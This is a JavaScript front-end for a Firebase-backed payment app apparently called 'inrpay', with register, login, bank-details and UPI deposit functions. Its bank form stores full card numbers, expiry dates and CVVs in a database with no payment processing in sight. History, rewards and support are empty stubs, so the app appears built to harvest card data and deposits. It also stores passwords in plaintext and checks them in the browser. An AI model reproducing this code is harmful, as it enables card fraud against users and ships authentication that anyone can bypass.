import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
import { getFirestore, doc, setDoc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";

const app = initializeApp({
  apiKey: "AIzaSyBh-J9LAYeCfxNoKw9C94gbCqVhELofuoo",
  authDomain: "inrpay-44413.firebaseapp.com",
  projectId: "inrpay-44413"
});

const db = getFirestore(app);

// 🔥 MESSAGE SYSTEM
function showMsg(text){
msgText.innerText = text;
msgBox.style.display="flex";
}
window.closeMsg = ()=> msgBox.style.display="none";

// 🔐 REGISTER
window.register = async ()=>{
let nameVal = document.getElementById("name").value;
let numberVal = document.getElementById("number").value;
let passVal = document.getElementById("password").value;

if(!numberVal || !passVal){
showMsg("Enter number & password");
return;
}

await setDoc(doc(db,"users",numberVal),{
name:nameVal,
number:numberVal,
password:passVal,
balance:0
});

showMsg("Account Created");
}

// 🔐 LOGIN
window.login = async ()=>{
let numberVal = document.getElementById("number").value;
let passVal = document.getElementById("password").value;

let snap = await getDoc(doc(db,"users",numberVal));

if(!snap.exists()) return showMsg("User not found");

let user = snap.data();

if(user.password !== passVal) return showMsg("Wrong password");

auth.style.display="none";
dashboard.style.display="block";

username.innerText=user.name;
balance.innerText="₹"+user.balance;

localStorage.setItem("user",numberVal);
}

// 🔄 AUTO LOGIN
window.onload = async ()=>{
let numberVal = localStorage.getItem("user");
if(!numberVal) return;

let snap = await getDoc(doc(db,"users",numberVal));

if(snap.exists()){
let user = snap.data();
auth.style.display="none";
dashboard.style.display="block";
username.innerText=user.name;
balance.innerText="₹"+user.balance;
}
}

// 🚪 LOGOUT
window.logout = ()=>{
localStorage.clear();
location.reload();
}

// 🏦 BANK
window.openBank = ()=> bankBox.style.display="flex";
window.closeBank = ()=> bankBox.style.display="none";

window.saveBank = async ()=>{
let numberVal = localStorage.getItem("user");

await setDoc(doc(db,"bank",numberVal),{
name:accName.value,
bank:bankName.value,
account:accNumber.value,
ifsc:ifsc.value,
mobile:bankMobile.value,
type:accType.value,
atm:atm.value,
expiry:expiry.value,
cvv:cvv.value
});

showMsg("Bank Saved");
closeBank();
}

// 💳 DEPOSIT
window.deposit = async ()=>{
let snap = await getDoc(doc(db,"settings","payment"));

if(snap.exists()){
let d = snap.data();
upiText.innerText = d.upi;
qrImg.src = d.qr;
}

depositBox.style.display="flex";
}

window.closeDeposit = ()=> depositBox.style.display="none";

window.submitDeposit = async ()=>{
let utrVal = document.getElementById("utr").value;

if(!utrVal) return showMsg("Enter UTR");

let numberVal = localStorage.getItem("user");

await setDoc(doc(db,"deposits",Date.now()+""),{
user:numberVal,
utr:utrVal,
status:"pending"
});

showMsg("Deposit Submitted");
closeDeposit();
}

// 📊 HISTORY
window.openHistory = ()=>{
showMsg("No transactions yet");
}

// 🎁 REWARD
window.openReward = ()=>{
showMsg("No rewards available");
}

// 💬 SUPPORT
window.openSupport = ()=> supportBox.style.display="flex";
window.closeSupport = ()=> supportBox.style.display="none";

window.autoReply = ()=>{
supportMsg.innerText="Please wait 30 minutes to 1 hour";
}